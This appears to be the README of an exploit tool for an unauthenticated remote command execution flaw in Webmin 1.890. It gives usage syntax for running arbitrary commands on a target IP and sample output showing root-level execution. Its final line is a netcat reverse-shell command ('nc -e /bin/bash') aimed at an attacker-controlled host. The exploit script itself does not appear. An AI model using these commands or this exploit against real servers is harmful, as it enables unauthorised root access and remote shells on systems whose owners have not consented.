# WebMin-1.890-Unauthenticated-RCE

Webmin 1.890 is vulnerable to RCE if “user password change” option to be enabled.<br>

#USAGE: python3 exploit.py [TARGET IP] [COMMAND]
<br>
#Example Output:<br>
<code>python3 exploit.py 1**.2*.*.*** id</code>

&lt;h1&gt;Error - Perl execution failed&lt;/h1&gt;<br>
&lt;p&gt;Your password has expired, and a new one must be chosen.<br>
<strong>uid=0(root) gid=0(root) groups=0(root)</strong><br>
&lt;/p&gt;

<code>python3 exploit.py 1**.2*.*.*** nc -e /bin/bash [LHOST] [LPORT] </code>
